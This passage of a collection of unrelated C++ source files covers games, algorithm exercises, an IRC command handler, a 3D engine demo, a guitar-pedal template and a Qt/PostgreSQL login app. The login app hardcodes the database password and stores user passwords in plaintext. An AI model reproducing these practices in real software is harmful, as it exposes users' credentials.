ofApp::mouseDragged(ofMouseEventArgs &e)\n{\n    ofelia.mouseDragged(e);\n}\n\n//--------------------------------------------------------------\nvoid ofApp::mousePressed(ofMouseEventArgs &e)\n{\n    ofelia.mousePressed(e);\n}\n\n//--------------------------------------------------------------\nvoid ofApp::mouseReleased(ofMouseEventArgs &e)\n{\n    ofelia.mouseReleased(e);\n}\n\n//--------------------------------------------------------------\nvoid ofApp::mouseEntered(ofMouseEventArgs &e)\n{\n    ofelia.mouseEntered(e);\n}\n\n//--------------------------------------------------------------\nvoid ofApp::mouseExited(ofMouseEventArgs &e)\n{\n    ofelia.mouseExited(e);\n}\n\n//--------------------------------------------------------------\nvoid ofApp::windowResized(ofResizeEventArgs &e)\n{\n    ofelia.windowResized(e);\n}\n\n//--------------------------------------------------------------\nvoid ofApp::messageReceived(ofMessage &e)\n{\n    ofelia.messageReceived(e);\n}\n\n//--------------------------------------------------------------\nvoid ofApp::dragged(ofDragInfo &e)\n{\n    ofelia.dragged(e);\n}\n",
    "#include \"main.h\"\n\n\nMainApp::MainApp(int argc, char *argv[]) : QApplication(argc, argv) {\n    db = QSqlDatabase::addDatabase(\"QPSQL\");\n    db.setHostName(\"localhost\");\n    db.setDatabaseName(\"postgres\");\n    db.setUserName(\"postgres\");\n    db.setPassword(\"admin\");\n\n    w = new initial;\n    w2 = new regestration;\n    admpanel = new adminpanel;\n    userpanel = new UserPanel;\n\n    if (!db.open()) {\n        qDebug() << \"Failed to open database:\" << db.lastError().text();\n        return;\n    }\n\n    w->show();\n    w->setWindowTitle(\"\u0420\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u044f || \u0412\u0445\u043e\u0434\");\n    QIcon qic1(\":/image/app_icon\");\n    w->setWindowIcon(qic1);\n\n    connect(w, &initial::openRegistrationWindow, this, &MainApp::openRegistrationWindow);\n    connect(w2, &regestration::RegistrUser, this, &MainApp::PushRegistrButton);\n    connect(w, &initial::LoginUser, this, &MainApp::PushLoginButton);\n    connect(admpanel, &adminpanel::addUser, this, &MainApp::AddUser);\n    connect(admpanel, &adminpanel::deleteUser, this, &MainApp::DeleteUser);\n    connect(userpanel, &UserPanel::addLine, this, &MainApp::AddLine);\n    connect(userpanel, &UserPanel::deleteLine, this, &MainApp::DeleteLine);\n\n}\n\n\n\nvoid MainApp::openRegistrationWindow() {\n    w2->setWindowTitle(\"\u0420\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u044f\");\n    w2->show();\n    w->hide();\n}\n\n\nvoid MainApp::PushRegistrButton()\n{\n    QString login = w2->login;\n    QString password = w2->password;\n\n    QSqlQuery query(db);\n    query.prepare(\"INSERT INTO users (login, password) VALUES (:login, :password)\");\n    query.bindValue(\":login\", login);\n    query.bindValue(\":password\", password);\n\n    if (!query.exec()) {\n        qDebug() << \"Error executing query:\" << query.lastError().text();\n        QString error = query.lastError().text();\n        QMessageBox::warning(w2, \"\u041e\u0448\u0438\u0431\u043a\u0430\", error, QMessageBox::Ok);\n\n\n    } else {\n        qDebug() << \"User registered successfully\";\n        QMessageBox::information(w2, \"\u0423\u0441\u043f\u0435\u0445!\", \"\u0412\u044b \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0437\u0430\u0440\u0435\u0433\u0435\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u043b\u0438\u0441\u044c!\", QMessageBox::Ok);\n    }\n}\n\n\nvoid MainApp::PushLoginButton()\n{\n    QString login = w->login;\n    QString password = w->password;\n\n    bool isAdmin = checkUserStatus(login, password);\n\n    if (isAdmin) {\n        w->close();\n\n        QSqlQuery query1(db);\n        query1.exec(\"SELECT * FROM users;\");\n\n        modal = new QSqlTableModel(this, db);\n        modal->setTable(\"users\");\n        modal->select();\n        admpanel->uiadpanel->tableView->setModel(modal);\n        admpanel->show();\n\n    } else if (!isAdmin) {\n        w->close();\n        QSqlQuery query1(db);\n        query1.exec(\"SELECT * FROM warehouse;\");\n         modal = new QSqlTableModel(this, db);\n        modal->setTable(\"warehouse\");\n        modal->select();\n\n        userpanel->ui->tableView->setModel(modal);\n        userpanel->show();\n    }\n}\n\nvoid MainApp::DeleteUser() {\n    modal->removeRow(admpanel->row);\n    modal->select();\n}\n\nvoid MainApp::AddUser()\n{\n    modal->insertRow(modal->rowCount());\n}\n\nvoid MainApp::DeleteLine() {\n    modal->removeRow(userpanel->row);\n    modal->select();\n}\n\nvoid MainApp::AddLine()\n{\n    modal->insertRow(modal->rowCount());\n}\n\nbool MainApp::checkUserStatus(const QString& login, const QString& password) {\n    QSqlQuery query;\n    query.prepare(\"SELECT status FROM users WHERE login = :login AND password = :password\");\n    query.bindValue(\":login\", login);\n    query.bindValue(\":password\", password);\n\n    if (query.exec()) {\n        if (query.next()) {\n            bool isAdmin = query.value(0).toBool();\n            return isAdmin;\n        }\n    }\n\n    return false;\n}\n\n\nMainApp::~MainApp() {\n    delete w;\n    delete w2;\n    delete userpanel;\n    delete admpanel;\n    db.close();\n}\n\n\n\nint main(int argc, char *argv[]) {\n\n\n    MainApp app(argc, argv);\n\n    return app.exec();\n\n}\n",
    "//\n// Created by LiYuanzhe on 2024/5/14.\n//\n#include \"vector\"\n#include \"queue\"\n\nusing namespace std;\n\nint orangesRotting(vector<vector<int>> &grid) {\n    queue <pair<int, int>> q;\n    int sum = 0;\n    int m = grid.size();\n    int n = grid[0].size();\n    for (int i = 0; i < m; i++) {\n        for (int j = 0; j < n; j++) {\n            if (grid[i][j] == 2) {\n                q.emplace(i, j);\n            }\n            if (grid[i][j] == 1) {\n                sum++;\n            }\n        }\n    }\n    if (sum == 0) {\n        return 0;\n    }\n\n    if (q.size() == 0) {\n        return -1;\n    }\n    int distance[4][2] = {{1,  0},\n                          {0,  1},\n                          {-1, 0},\n                          {0,  -1}};\n    int res = 0;\n    while (!q.empty()) {\n        int s = q.size();\n        for (int i = 0; i < s; i++) {\n            pair<int, int> p = q.front();\n            q.pop();\n            int x = p.first;\n            int y = p.second;\n            for (const auto &d: distance) {\n                if (x + d[0] >= 0 && x + d[0] < m && y + d[1] >= 0 && y + d[1] < n &&\n                    grid[x + d[0]][y + d[1]] == 1) {\n                    q.emplace(x + d[0], y + d[1]);\n                    grid[x + d[0]][y + d[1]] = 2;\n                    sum--;\n                }\n            }\n        }\n        res++;\n    }\n    return sum == 0 ? res - 1 : -1;\n}",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <ctime>\r\nusing namespace std;\r\n \r\nint main() {\r\n    srand(time(0));\r\n    char playAgain;\r\n    do {\r\n        int randomNumber = rand() % 100 + 1;\r\n        int guess;\r\n        int attempts = 0;\r\n        int score = 100;\r\n        cout << \"Welcome to the Number Guessing Game!\" << endl;\r\n        cout << \"Try to guess the number between 1 and 100\" << endl;\r\n        do {\r\n            cout << \"Enter your guess: \";\r\n            cin >> guess;\r\n            attempts++;\r\n            if (guess > randomNumber) {\r\n                cout << \"Too high! Try again\" << endl;\r\n                score -= 10;\r\n            } else if (guess < randomNumber) {\r\n                cout << \"Too low! Try again\" << endl;\r\n                score -= 10;\r\n            } else {\r\n                cout << \"You guessed the number \" << randomNumber << \" in \" << attempts << \" attempts!\" << endl;\r\n                cout << \"Your score is: \" << score << endl;\r\n            }\r\n        } while (guess != randomNumber && score > 0);\r\n        if (score == 0) {\r\n            cout << \"Game over!\" << endl;\r\n        }\r\n        cout << \"Do you want to play again? (y/n): \";\r\n        cin >> playAgain;\r\n    } while (playAgain == 'y' || playAgain == 'Y');\r\n    cout << \"Thank you for playing!\" << endl;\r\n    return 0;\r\n}\r\n\r\n",
    "//\n//  main.cpp\n//  Fish-Fillet-Project\n//\n//  Created by Yehia Sharawy on 21/12/2023.\n//\n\n//Libraries\n#ifdef __APPLE__\n#define GL_SILENCE_DEPRECATION  //remove anu OPENGL Deprications\n#include <GLUT/glut.h>\n#else\n#include<GL/glut.h>\n#endif\n#include <math.h>\n#include <cstring>\n#include<stdlib.h>\n#include <ctime>\n#include <vector>\n\n//Global Variables\nint physicalWidth = 1200;\nint physicalHeight = 600;\nint logicalWidth = 1200;\nint logicalHeight = 600;\nint centerX = logicalWidth/2;\nint centerY = logicalHeight/2;\nint mouseX=centerX, mouseY=centerY;\n\nbool isGameOver = false;\nint score = 0;\nint gameTime = 10;\nint F2Pressed = 0;\nint yellow =0;\nbool allYellowFishGone = false;\n\n//waves animation\nbool sqUp=true;\nint sqDelta=0;\nint maxY=15;\n\n\nvoid textDisplay(char *str,int x,int y) {\n    glRasterPos2d(x,y);\n    for (int i=0;i< strlen(str);i++)\n        glutBitmapCharacter(GLUT_BITMAP_HELVETICA_12,str[i]);\n    glFlush();\n}\n\nvoid scoreDisplay(int posx, int posy, int score)\n{\n    glRasterPos2d(posx,posy);\n    if (score < 0) {\n            glutBitmapCharacter(GLUT_BITMAP_HELVETICA_12, '-');\n            score = -score;// change score positive for display\n        }\n    int numDigits = (score == 0) ? 1 : 0;\n        int temp = score;\n        while (temp != 0) {\n            temp /= 10;\n            ++numDigits;\n        }\n        char scoreStr[numDigits + 1]; // +1 for null terminator\n        sprintf(scoreStr, \"%d\", score);\n\n        for (int i = 0; i < numDigits; ++i) {\n            glutBitmapCharacter(GLUT_BITMAP_HELVETICA_12, scoreStr[i]);\n        }\n        glFlush();\n    glFlush();\n}\n\nvoid gameOver(char *str,int x,int y) {\n    glRasterPos2d(x,y);\n    for (int i=0;i< strlen(str);i++)\n        glutBitmapCharacter(GLUT_BITMAP_TIMES_ROMAN_24,str[i]);\n    glFlush();\n}\n\nvoid Timer(int value) {\n    glutTimerFunc(10, Timer, value);\n    glutPostRedisplay();\n}\n\nvoid DrawWaves(float cx, float cy, float r, int num_segments){\n    glBegin(GL_POLYGON);\n    for (int i = 0; i < num_segments; i++) {\n        float theta = 2.0f * 3.1415926f * float(i) / float(num_segments);//get the current angle\n        float x = r * cosf(theta-44.92);//calculate the x component\n        float y = r * sinf(theta-44.92);//calculate the y component\n        glVertex2f(x + cx, y + cy + sqDelta);//output vertex\n    }\n    glEnd();\n}\n\nclass Fish{\npublic:\n    bool fishPlayer, playerDetected;\n    bool isRedFish;\n    int redFish=0, yellowFish=0;\n    float positionX, positionY;\n    float direction;\npublic:\n    Fish(bool isfishPlayer = false){\n        fishPlayer = isfishPlayer;\n        if(fishPlayer == true){\n            positionX = 600;\n            positionY = 300;\n            playerDetected = true;\n        }else{\n            isRedFish = rand() % 2 == 0;\n            positionX= static_cast<float>(rand() % (physicalWidth-100));\n            positionY = static_cast<float>(rand() % (physicalHeight-100));\n        }\n        direction = (rand() % 2)* 1.4f - 0.7f;\n    }\n    \n    void drawFish(){\n        if(isRedFish){\n            glColor3f(1, 0, 0);\n            redFish++;\n        }else{\n            glColor3f(1, 1, 0);\n            yellowFish++;\n            yellow++;\n        }\n        if(playerDetected){glColor3f(0, 0, 1);}\n        drawFish(positionX, positionY, direction);\n    }\n    void drawFish(float positionX, float positionY, float direction) {\n        // Tail\n        glBegin(GL_TRIANGLES);\n        glVertex2f(direction < 0 ? positionX - 15 : positionX + 15, positionY + 15);\n        glVertex2f(direction < 0 ? positionX + 20 : positionX - 20, positionY + 5);\n        glVertex2f(direction < 0 ? positionX + 20 : positionX - 20, positionY + 25);\n        glEnd();\n        // Body\n        glBegin(GL_TRIANGLES);\n        glVertex2f(positionX, positionY - 10);\n        glVertex2f(direction < 0 ? positionX - 30 : positionX + 30, positionY + 15);\n        glVertex2f(positionX, positionY + 40);\n        glEnd();\n    }\n    void moveFish(float directionX= 0.0f,float directionY= 0.0f){\n        if(!fishPlayer){\n            positionX += direction;\n            if(positionX > physicalWidth){\n                positionX -= physicalWidth;\n                positionY = static_cast<float>(rand() % (physicalHeight-100));\n            }\n            if(positionX < 0){\n                positionX += physicalWidth;\n                positionY = static_cast<float>(rand() % (physicalHeight-100));\n            }\n        }else{// fish player mouse position\n            positionX = directionX;\n            positionY = 650 - directionY;\n        }\n    }\n};\n\nstd::vector<Fish> arrayOfFish; //create an array that will be filled with fish objects\nFish fishPlayer(true); //create a fish player\n\nvoid init2D(float r, float g, float b){// initializes the background color & add 20 fish in an array of fish\n    glClearColor(r,g,b,0);\n    for (int i = 0; i < 20; ++i) {\n        arrayOfFish.push_back(Fish());\n    }\n    glMatrixMode(GL_PROJECTION);\n    gluOrtho2D(0.0,logicalWidth,0.0,logicalHeight);\n}\n\nvoid passiveMouse (int x,int y){ //moves the pla",
    "#include \"EBG.h\"\r\n#include \"EBG_3d.h\"\r\n\r\nebg::basic_engine beta;\r\nebg::upoint window_dimension(1920, 1080);\r\n\r\nLRESULT CALLBACK window_proc(HWND hwnd, UINT u_msg, WPARAM w_param, LPARAM l_param)\r\n{\r\n\tif (beta.mouse.update_clicks(u_msg))\r\n\t\treturn 0;\r\n\r\n\tswitch (u_msg)\r\n\t{\r\n\tcase WM_CLOSE:\r\n\t\tbeta.running = false;\r\n\t\treturn 0;\r\n\tcase WM_KEYDOWN:\r\n\t\tif (beta.keyboard.update_key_down(w_param))\r\n\t\t\treturn 0;\r\n\t\treturn 0;\r\n\tcase WM_KEYUP:\r\n\t\tif (beta.keyboard.update_key_up(w_param))\r\n\t\t\treturn 0;\r\n\t\tif (w_param == VK_ESCAPE)\r\n\t\t\tbeta.running = false;\r\n\t\treturn 0;\r\n\tdefault:\r\n\t\treturn DefWindowProcA(hwnd, u_msg, w_param, l_param);\r\n\t}\r\n}\r\n\r\n#define Surface beta.surface\r\n\r\nint WINAPI WinMain(\r\n\tHINSTANCE hInstance,\r\n\tHINSTANCE hPrevInstance,\r\n\tLPSTR lpCmdLine,\r\n\tint nShowCmd\r\n)\r\n{\r\n\tusing namespace ebg;\r\n\tusing namespace eb3d;\r\n\r\n\tdata::init();\r\n\tsincos::init(12);\r\n\r\n\tbeta = basic_engine(\"Test b1 3d\", window_dimension, false, 50, window_proc, hInstance, true);\r\n\r\n\tcamera cam(M_PI_3, EPSILON, { 0.0f, 0.0f, 0.0f }, { 0.0f, 0.0f, 0.0f }/*, {0.0f, 0.0f, 0.0f}*/);\r\n\r\n\t/*\r\n\tdynamic_mesh cube(8, 12, { 0.0f, 0.0f, 3.0f }, { 0.0f, 0.0f, 0.0f });\r\n\r\n\tcube.local_vertices[0] = { -1.0f, -1.0f, -1.0f };\r\n\tcube.local_vertices[1] = { 1.0f, -1.0f, -1.0f };\r\n\tcube.local_vertices[2] = { -1.0f,  1.0f, -1.0f };\r\n\tcube.local_vertices[3] = { 1.0f,  1.0f, -1.0f };\r\n\tcube.local_vertices[4] = { -1.0f, -1.0f,  1.0f };\r\n\tcube.local_vertices[5] = { 1.0f, -1.0f,  1.0f };\r\n\tcube.local_vertices[6] = { -1.0f,  1.0f,  1.0f };\r\n\tcube.local_vertices[7] = { 1.0f,  1.0f,  1.0f };\r\n\r\n\t// F*CKING CLOCKWISE\r\n\tcube.triangles[0] = { 0, 2, 1 }; // Front\r\n\tcube.triangles[1] = { 3, 1, 2 };\r\n\tcube.triangles[2] = { 1, 5, 0 }; // Bottom\r\n\tcube.triangles[3] = { 4, 0, 5 };\r\n\tcube.triangles[4] = { 2, 6, 3 }; // Top\r\n\tcube.triangles[5] = { 6, 7, 3 };\r\n\tcube.triangles[6] = { 0, 4, 2 }; // Left\r\n\tcube.triangles[7] = { 4, 6, 2 };\r\n\tcube.triangles[8] = { 1, 3, 7 }; // Right\r\n\tcube.triangles[9] = { 5, 1, 7 };\r\n\tcube.triangles[10] = { 4, 5, 6 }; // Back\r\n\tcube.triangles[11] = { 7, 6, 5 };\r\n\r\n\tcube.setup();\r\n\t*/\r\n\r\n\t// dynamic_mesh teapot(\"utahTeapot.txt\", { 0.0f, -1.5f, 7.0f }, { 0.0f, 0.0f, 0.0f });\r\n\t// teapot.setup();\r\n\t// dynamic_mesh stone(\"unk.txt\", { 5.0f, -2.5f, 0.0f }, { 0.0f, -M_PI_4, 0.0f });\r\n\t// stone.setup();\r\n\t// dynamic_mesh thing(\"unk2.txt\", { 0.0f, -6.0f, 20.0f }, { 0.0f, M_PI_3, 0.0f });\r\n\t// thing.setup();\r\n\t// dynamic_mesh ship(\"spaceship.txt\", { 0.0f, -2.0f, 8.0f }, { 0.0f, M_PI_4, 0.0f });\r\n\t// ship.setup();\r\n\r\n\tcompound_mesh landscape(\"lan.txt\", {5.0f, 2.0f, 5.0f});\r\n\tlandscape.setup(&cam);\r\n\tlandscape.bccd.rm = 0.7f;\r\n\tlandscape.bccd.rc = 0.0f;\r\n\tlandscape.bccd.gm = 0.5f;\r\n\tlandscape.bccd.gc = 0.5f;\r\n\tlandscape.bccd.bm = -0.2f;\r\n\tlandscape.bccd.bc = 0.5f;\r\n\r\n\tcompound_mesh sphere(\"sphere.txt\", { 0.0f, 3.0f, 0.0f }, { 0.0f, 0.0f, 0.0f }, 5.0f);\r\n\tsphere.setup(&cam);\r\n\tsphere.bccd.rm = 1.0f;\r\n\tsphere.bccd.rc = 0.0f;\r\n\tsphere.bccd.gm = -0.1f;\r\n\tsphere.bccd.gc = 0.1f;\r\n\tsphere.bccd.bm = 1.0f;\r\n\tsphere.bccd.bc = 0.0f;\r\n\r\n\tcompound_mesh sun(\"sphere.txt\", { 1500.0f, 700.0f, 700.0f }, { 0.0f, 0.0f, 0.0f }, 1000.0f);\r\n\tsun.setup(&cam);\r\n\tsun.bccd.rm = 1.0f;\r\n\tsun.bccd.rc = 0.0f;\r\n\tsun.bccd.gm = 0.7f;\r\n\tsun.bccd.gc = 0.3f;\r\n\tsun.bccd.bm = 0.0f;\r\n\tsun.bccd.bc = 0.0f;\r\n\r\n\tcompound_mesh unk3(\"unk3.txt\", { 1.0f, 10.0f, 1.0f }, { 0, 0, 0 }, 4.0f);\r\n\tunk3.setup(&cam);\r\n\tunk3.bccd.rm = -1.0f;\r\n\tunk3.bccd.rc = 1.0f;\r\n\tunk3.bccd.gm = 0.7f;\r\n\tunk3.bccd.gc = 0.3f;\r\n\tunk3.bccd.bm = 0.7f;\r\n\tunk3.bccd.bc = 0.0f;\r\n\r\n\tsphere_collision_module collision;\r\n\tcollision.orianted_position = &sphere.position;\r\n\tcollision.radius = 1.0f;\r\n\r\n\t/*\r\n\tdynamic_mesh ship(3, 1, { 0.0f, -0.1f, 1.0f }, { 0.0f, 0.0f, 0.0f });\r\n\r\n\tship.local_vertices[0] = { 0.0f, 0.0f, 0.0f };\r\n\tship.local_vertices[1] = { 0.0f, 0.0f, 4.0f };\r\n\tship.local_vertices[2] = { 0.1f, 0.0f, 5.0f };\r\n\r\n\tship.triangles[0] = { 0, 1, 2 };\r\n\tship.setup();\r\n\t*/\r\n\r\n\twhile (beta.running)\r\n\t{\r\n\t\tbeta.start_tick();\r\n\r\n\t\t/*\r\n\t\tfloat some_multipler = beta.delta_time * 0.001f;\r\n\r\n\t\tif (beta.keyboard.get_key('w'))\r\n\t\t\tcam.position += cam.forward * some_multipler;\r\n\t\telse if (beta.keyboard.get_key('s'))\r\n\t\t\tcam.position -= cam.forward * some_multipler;\r\n\r\n\t\tif (beta.mouse.right)\r\n\t\t{\r\n\t\t\tcam.rotation.rotation.y += static_cast<float>(beta.mouse.delta.x) * some_multipler;\r\n\t\t\tcam.rotation.rotation.x -= static_cast<float>(beta.mouse.delta.y) * some_multipler;\r\n\t\t\tcam.update();\r\n\t\t}\r\n\t\t*/\r\n\r\n\t\t0 >> Surface;\r\n\r\n\t\t// (float)0b01111111011111110111111101111111 = very large float number\r\n\t\tmemset(beta.depth_buffer, 0b01111111, Surface.buffer_size << 2);\r\n\r\n\t\t/*\r\n\t\tcube.rotation.rotation += fvec3(0.01f, -0.01f, 0.02f);\r\n\r\n\t\t// local vertex to world vertex\r\n\t\tcube.update();\r\n\r\n\t\t// calculate screen position of vertex\r\n\t\t// cube.calc_surface_points(&cam, &beta);\r\n\r\n\t\t// draw only lines\r\n\t\tcube.draw(&cam, &Surface);\r\n\r\n\t\t// draw normals\r\n\t\tcube.draw_normals(&cam, &beta);\r\n\t\t*/\r\n\r\n\t\t/*\r\n\t\tchar m = beta.keyboard.get_key('c') | (beta.keyboard.get_key",
    "/* ************************************************************************** */\r\n/*                                                                            */\r\n/*                                                        :::      ::::::::   */\r\n/*   invite.cpp                                         :+:      :+:    :+:   */\r\n/*                                                    +:+ +:+         +:+     */\r\n/*   By: tcharpen <tcharpen@student.42lyon.fr>      +#+  +:+       +#+        */\r\n/*                                                +#+#+#+#+#+   +#+           */\r\n/*   Created: 2023/07/30 12:47:48 by tcharpen          #+#    #+#             */\r\n/*   Updated: 2023/07/30 12:47:48 by tcharpen         ###   ########lyon.fr   */\r\n/*                                                                            */\r\n/* ************************************************************************** */\r\n\r\n#include \"../../includes/commands/Command.hpp\"\r\n\r\nvoid    invite(const std::string &message, Client *client, Server *server)\r\n{\r\n\tstd::string\t\t\tnickname;\r\n\tstd::string\t\t\tchannel_name;\r\n\tChannel\t\t\t\t*channel;\r\n\tClient\t\t\t\t*target;\r\n\tstd::stringstream\toutput;\r\n\r\n\tnickname = parseFirstWord(message);\r\n\tif (nickname == \"\")\r\n\t{\r\n\t\tE461(client->getFd(), client->getNickname(), server, \"INVITE\");\r\n\t\treturn ;\r\n\t}\r\n\tchannel_name = parseFirstWord(message.substr(message.find(nickname) + nickname.size()));\r\n\tif (channel_name == \"\")\r\n\t{\r\n\t\tE461(client->getFd(), client->getNickname(), server, \"INVITE\");\r\n\t\treturn ;\r\n\t}\r\n\ttarget = server->isClient(nickname);\r\n\tif (!target)\r\n\t{\r\n\t\tE401(client->getFd(), client->getNickname(), server, nickname);\r\n\t\treturn ;\r\n\t}\r\n\tchannel = server->isChannel(channel_name);\r\n\tif (!channel)\r\n\t\tE403(client->getFd(), client->getNickname(), server, channel_name);\r\n\telse if (!channel->isInChannel(client))\r\n\t\tE442(client->getFd(), client->getNickname(), server, channel_name);\r\n\telse if (channel->getModes().find('i') != std::string::npos\r\n\t\t&& !channel->isOperator(client->getUsername()))\r\n\t\tE482(client->getFd(), client->getNickname(), server, channel_name);\r\n\telse if (channel->isInChannel(target))\r\n\t\tE443(client->getFd(), client->getNickname(), server, channel_name, nickname);\r\n\telse\r\n\t{\r\n\t\tif (!channel->isInInvited(target->getUsername()))\r\n\t\t\tchannel->addInvited(target->getUsername());\r\n\t\tR341(client->getFd(), client->getNickname(), server, channel_name, nickname);\r\n\t\toutput.str(\"\");\r\n\t\toutput << clientId(client->getNickname(), client->getUsername(), client->getHostname())\r\n\t\t\t<< \" INVITE \" << nickname << \" \" << channel_name;\r\n\t\tsend_to_client_things(output.str(), target->getFd(), server);\r\n\t}\r\n}\r\n",
    "#include <algorithm>\n#include \"vector\"\n\nusing namespace std;\n\n// TODO 3072. \u5c06\u5143\u7d20\u5206\u914d\u5230\u4e24\u4e2a\u6570\u7ec4\u4e2d II\nclass Fenwick {\n    vector<int> tree;\n\npublic:\n    Fenwick(int n) : tree(n) {}\n\n    // \u628a\u4e0b\u6807\u4e3a i \u7684\u5143\u7d20\u589e\u52a0 1\n    void add(int i) {\n        while (i < tree.size()) {\n            tree[i]++;\n            i += i & -i;\n        }\n    }\n\n    // \u8fd4\u56de\u4e0b\u6807\u5728 [1,i] \u7684\u5143\u7d20\u4e4b\u548c\n    int pre(int i) {\n        int res = 0;\n        while (i > 0) {\n            res += tree[i];\n            i &= i - 1;\n        }\n        return res;\n    }\n};\n\nvector<int> resultArray(vector<int> &nums) {\n    auto sorted = nums;\n    ranges::sort(sorted);\n    sorted.erase(unique(sorted.begin(), sorted.end()), sorted.end());\n    int m = sorted.size();\n\n    vector<int> a{nums[0]}, b{nums[1]};\n    Fenwick t1(m + 1), t2(m + 1);\n    t1.add(ranges::lower_bound(sorted, nums[0]) - sorted.begin() + 1);\n    t2.add(ranges::lower_bound(sorted, nums[1]) - sorted.begin() + 1);\n    for (int i = 2; i < nums.size(); i++) {\n        int x = nums[i];\n        int v = ranges::lower_bound(sorted, x) - sorted.begin() + 1;\n        int gc1 = a.size() - t1.pre(v); // greaterCount(a, v)\n        int gc2 = b.size() - t2.pre(v); // greaterCount(b, v)\n        if (gc1 > gc2 || gc1 == gc2 && a.size() <= b.size()) {\n            a.push_back(x);\n            t1.add(v);\n        } else {\n            b.push_back(x);\n            t2.add(v);\n        }\n    }\n    a.insert(a.end(), b.begin(), b.end());\n    return a;\n}\n",
    "#include \"../include/Post.hpp\"\n\nPost::Post(int id, std::string texto, std::string username) : id(id), texto(texto), username(username) {}\n\n/**\n * @brief forma e retorna uma imagem com o tamanho desejado\n * @param filePath caminho da imagem\n * @param width largura da imagem\n * @param heigth altura da imagem\n * @return GtkWidget que \u00e9 um GtkImage\n*/\nGtkWidget* newScaledImage(const gchar *filePath, gint width, gint height) {\n    GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file(filePath, NULL);\n    GdkPixbuf *scaled_pixbuf = gdk_pixbuf_scale_simple(pixbuf, width, height, GDK_INTERP_BILINEAR);\n    GtkWidget *image = gtk_image_new_from_pixbuf(scaled_pixbuf);\n    g_object_unref(pixbuf);\n    g_object_unref(scaled_pixbuf);\n    return image;\n}\n\n/**\n * @brief adapta uma imagem para as dimensoes desejadas\n * @param filePath caminho da imagem\n * @param width largura da imagem\n * @param heigth altura da imagem\n * @return void\n*/\nvoid setScaledImage(GtkImage* image, const gchar *filePath, gint width, gint height) {\n    GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file(filePath, NULL);\n    GdkPixbuf *scaled_pixbuf = gdk_pixbuf_scale_simple(pixbuf, width, height, GDK_INTERP_BILINEAR);\n    gtk_image_set_from_pixbuf(image, pixbuf);\n    g_object_unref(pixbuf);\n    g_object_unref(scaled_pixbuf);\n}\n\n",
    "#include \"daisy_petal.h\"\n#include \"daisysp.h\"\n#include \"funbox.h\"\n\n//\n// This is a template for creating a pedal on the GuitarML Funbox_v1/Daisy Seed platform.\n// You can start from here to fill out your effects processing and controls.\n// Allows for Stereo In/Out, 6 knobs, 3 3-way switches, 2 dipswitches, 2 SPST Footswitches, 2 LEDs.\n//\n// Keith Bloemer 5/20/2024\n//\n\nusing namespace daisy;\nusing namespace daisysp;\nusing namespace funbox;  // This is important for mapping the correct controls to the Daisy Seed on Funbox PCB\n\n// Declare a local daisy_petal for hardware access\nDaisyPetal hw;\nParameter param1, param2, param3, param4, param5, param6;\n\n\nbool            bypass;\n\nbool            pswitch1[2], pswitch2[2], pswitch3[2], pdip[2];\nint             switch1[2], switch2[2], switch3[2], dip[2];\n\n\nLed led1, led2;\n\n\nvoid updateSwitch1() // left=, center=, right=\n{\n    if (pswitch1[0] == true) {  // left\n\n    } else if (pswitch1[1] == true) {  // right\n\n\n    } else {   // center\n\n    }      \n}\n\nvoid updateSwitch2() // left=, center=, right=\n{\n    if (pswitch2[0] == true) {  // left\n\n    } else if (pswitch2[1] == true) {  // right\n\n\n    } else {   // center\n\n    }    \n}\n\n\nvoid updateSwitch3() // left=, center=, right=\n{\n    if (pswitch3[0] == true) {  // left\n\n    } else if (pswitch3[1] == true) {  // right\n\n\n    } else {   // center\n\n    }    \n}\n\n\nvoid UpdateButtons()\n{\n\n    // (De-)Activate bypass and toggle LED when left footswitch is let go, or enable/disable amp if held for greater than 1 second //\n    // Can only disable/enable amp when not in bypass mode\n    if(hw.switches[Funbox::FOOTSWITCH_1].FallingEdge())\n    {\n        bypass = !bypass;\n        led1.Set(bypass ? 0.0f : 1.0f);\n    }\n\n\n    led1.Update();\n    led2.Update();\n\n}\n\n\nvoid UpdateSwitches()\n{\n    // Detect any changes in switch positions (3 On-Off-On switches and Dip switches)\n\n    // 3-way Switch 1\n    bool changed1 = false;\n    for(int i=0; i<2; i++) {\n        if (hw.switches[switch1[i]].Pressed() != pswitch1[i]) {\n            pswitch1[i] = hw.switches[switch1[i]].Pressed();\n            changed1 = true;\n        }\n    }\n    if (changed1) \n        updateSwitch1();\n    \n\n    // 3-way Switch 2\n    bool changed2 = false;\n    for(int i=0; i<2; i++) {\n        if (hw.switches[switch2[i]].Pressed() != pswitch2[i]) {\n            pswitch2[i] = hw.switches[switch2[i]].Pressed();\n            changed2 = true;\n        }\n    }\n    if (changed2) \n        updateSwitch2();\n\n    // 3-way Switch 3\n    bool changed3 = false;\n    for(int i=0; i<2; i++) {\n        if (hw.switches[switch3[i]].Pressed() != pswitch3[i]) {\n            pswitch3[i] = hw.switches[switch3[i]].Pressed();\n            changed3 = true;\n        }\n    }\n    if (changed3) \n        updateSwitch3();\n\n    // Dip switches\n    for(int i=0; i<2; i++) {\n        if (hw.switches[dip[i]].Pressed() != pdip[i]) {\n            pdip[i] = hw.switches[dip[i]].Pressed();\n            // Action for dipswitches handled in audio callback\n        }\n    }\n\n}\n\n\n\n// This runs at a fixed rate, to prepare audio samples\nstatic void AudioCallback(AudioHandle::InputBuffer  in,\n                          AudioHandle::OutputBuffer out,\n                          size_t                    size)\n{\n    //hw.ProcessAllControls();\n    hw.ProcessAnalogControls();\n    hw.ProcessDigitalControls();\n\n    UpdateButtons();\n    UpdateSwitches();\n \n\n    float vparam1 = param1.Process();\n    float vparam2 = param2.Process(); \n    float vparam3 = param3.Process();\n\n    float vparam4 = param4.Process();\n    float vparam5 = param5.Process();\n    float vparam6 = param6.Process();\n\n    // Handle Knob Changes Here\n\n\n\n    for(size_t i = 0; i < size; i++)\n    {\n\n        // Process your signal here\n        if(bypass)\n        {\n            \n            out[0][i] = in[0][i]; \n            out[1][i] = in[1][i];\n\n        }\n        else\n        {   \n\n            float inL = in[0][i];\n            float inR = in[1][i];\n\n\n            // Final mix\n            if (pdip[0] == false) {// Mono\n                //out[0][i] = (inL * dryMix + effectsL * wetMix) + (inL * dryMix + effectsR * wetMix) * vLevel / 2.0;\n                //out[1][i] = out[0][i];\n\n            } else { // MISO\n                //out[0][i] 